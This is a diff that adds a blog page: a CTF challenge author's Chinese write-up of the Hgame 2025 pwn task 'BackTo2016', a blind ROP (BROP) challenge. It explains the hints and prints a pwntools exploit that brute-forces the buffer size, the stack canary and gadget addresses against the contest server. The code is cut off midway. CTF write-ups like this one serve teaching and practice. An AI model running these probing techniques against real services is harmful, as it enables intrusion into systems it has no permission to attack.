@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="M1aoo0bin">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/03/18/hgamefinal2025/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="_(:3 」∠ )_ BackTo2016记一次程序运行时的小小型实验。 wp思路分析很容易找到这题的原型是 HCTF2016 的 出题人失踪了，也在赛时作为免费hint放出了，所以这里主要聊一些大家可能没有注意到的我给出的细节。  一进来设计成这样以及三个着色的词对应的是 HCTF2016 ，此题的libc版本，以及这个知识的论文原文。 这里给出 PID 是为了尽可能伪装成一个服务，以及希望选手">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hgame-final-2025-pwn-BackTo2016">
+<meta property="og:url" content="http://example.com/2025/03/18/Hgamefinal2025/index.html">
+<meta property="og:site_name" content="Z1naX5">
+<meta property="og:description" content="_(:3 」∠ )_ BackTo2016记一次程序运行时的小小型实验。 wp思路分析很容易找到这题的原型是 HCTF2016 的 出题人失踪了，也在赛时作为免费hint放出了，所以这里主要聊一些大家可能没有注意到的我给出的细节。  一进来设计成这样以及三个着色的词对应的是 HCTF2016 ，此题的libc版本，以及这个知识的论文原文。 这里给出 PID 是为了尽可能伪装成一个服务，以及希望选手">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250318201103.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/6a7ac6c71e01146411ae716c4cb887b0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250319092322.png">
+<meta property="article:published_time" content="2025-03-18T11:42:18.000Z">
+<meta property="article:modified_time" content="2025-03-19T02:06:52.653Z">
+<meta property="article:author" content="Z1naX5">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="出题手记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250318201103.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/pic/hello.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/pic/hello.png">
+    <meta name="theme-color" content="#3850AB">
+    <link rel="shortcut icon" href="/pic/hello.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hgame-final-2025-pwn-BackTo2016 -
+        
+        Zena Xu
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":5,"number":true,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#3850AB","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/pic/light_background.jpg","dark":"/pic/dark_background.png"},"title":"M1aoo0bin's Blog","subtitle":{"text":["晚安喵(,,・ω・,,)"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#363636","dark":"#d2dde8"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":25},"width":{"home":"1200px","pages":"1200px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"About":{"path":"/about","icon":"fa-regular fa-user"},"Links":{"path":"/links","icon":"fa-regular fa-link"}},"search":{"enable":true,"preload":true},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":10}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Zena Xu
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [40,0],
+                translateZ: 0,
+                opacity: [0,1],
+                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i,
+            }).add({
+                targets: '.ml13 .letter',
+                translateY: [0,-40],
+                opacity: [1,0],
+                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
+                easing: "easeInExpo",
+                duration: 1200,
+                delay: (el, i) => 100 + 30 * i,
+                complete: function() {
+                    hidePreloader(); // Call hidePreloader after the animation completes
+                }
+            });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/pic/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Zena Xu
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives/"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    LINKS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives/"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links"
+                        >
+                            <span>
+                                LINKS
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Hgame-final-2025-pwn-BackTo2016</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/pic/photo.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">M1aoo0bin</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-18 19:42:18</span>
+        <span class="mobile">2025-03-18 19:42:18</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-03-19 10:06:52</span>
+            <span class="mobile">2025-03-19 10:06:52</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Pwn/">Pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%87%BA%E9%A2%98%E6%89%8B%E8%AE%B0/">出题手记</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.9k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>12 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>_(:3 」∠ )_</p>
+<h2 id="BackTo2016"><a href="#BackTo2016" class="headerlink" title="BackTo2016"></a>BackTo2016</h2><p>记一次程序运行时的小小型实验。</p>
+<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>很容易找到这题的原型是 HCTF2016 的 出题人失踪了，也在赛时作为免费hint放出了，所以这里主要聊一些大家可能没有注意到的我给出的细节。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250318201103.png"
+                      alt="20250318201103"
+                ></p>
+<p>一进来设计成这样以及三个着色的词对应的是 <strong>HCTF2016</strong> ，此题的<strong>libc版本</strong>，以及这个知识的<strong>论文原文</strong>。</p>
+<p>这里给出 PID 是为了尽可能伪装成一个服务，以及希望选手能和 fork 联系起来。</p>
+<p>根据我放出的保护：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/6a7ac6c71e01146411ae716c4cb887b0.png"
+                      alt="6a7ac6c71e01146411ae716c4cb887b0"
+                ></p>
+<p>和原题有一个很大的区别就是，原题没有 canary 保护，以及程序崩溃后就结束了，而我的会在崩溃后重新再拉起一个，这也是此题 exp 中与原题非常大的一个差别，我们不会使用 close() 主动断开链接再拉起。</p>
+<p>这里给出保护的意义主要在于告诉大家程序的地址头来爆破，这道题之所以出成崩溃后在拉起是因为一开始想开启 PIE 保护，贴近真实环境，然而在测试后发现花费的时间过长，再加上每次还要爆破 canary ,所以最后还是关了。</p>
+<p>同时，即便是全盲，有没有 canary 也是可以测出来的。即通过测出填充 buf 长度后再加 b’\x00’ ，程序不奔溃且如果无 canary ,即返回地址最低两位为 00 是小概率事件，而如果崩溃了，则一定是无 canary 的。</p>
+<p>大部分的思路，我想下面几篇文章讲得是很清楚的，不多赘述，就直接放出exp了。</p>
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.scs.stanford.edu/brop/bittau-brop.pd00f" >论文原文 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="http://pwn4.fun/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/" >Blind Return Oriented Programming (BROP) Attack攻击原理 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.1_pwn_hctf2016_brop.html" >pwn HCTF2016 brop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./vuln&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(elf_path)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node1.hgame.vidar.club&#x27;</span>,<span class="number">30331</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_buffer_size</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">        payload = <span class="string">&quot;a&quot;</span> * i</span><br><span class="line">        buf_size = <span class="built_in">len</span>(payload) - <span class="number">1</span></span><br><span class="line">        p.send(payload)</span><br><span class="line">        v = p.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;*** stack smashing detected ***&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">            log.info(<span class="string">&quot;buffer size: %d&quot;</span> % buf_size)</span><br><span class="line">            <span class="keyword">return</span> buf_size</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.info(<span class="string">&quot;bad: %d&quot;</span> % buf_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>(<span class="params">x</span>):</span><br><span class="line">    canary = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            payload = <span class="string">b&quot;a&quot;</span> * x + canary + p8(i)</span><br><span class="line">            p.send(payload)</span><br><span class="line">            v = p.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;*** stack smashing detected ***&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> v:</span><br><span class="line">                canary += p8(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    canary = u64(canary)</span><br><span class="line">    success(<span class="string">&quot;canary:&quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop_addr</span>(<span class="params">buf_size, canary</span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        payload = <span class="string">b&quot;a&quot;</span> * buf_size + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        v = p.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;killed&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.info(<span class="string">&quot;stop_addr: 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gadgets_addr</span>(<span class="params">buf_size, canary, stop_addr</span>):</span><br><span class="line">    addr = <span class="number">0x400a80</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="comment">#sleep(0.1)</span></span><br><span class="line">        payload = <span class="string">b&quot;a&quot;</span> * buf_size + p64(canary) + p64(addr)</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        payload += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + 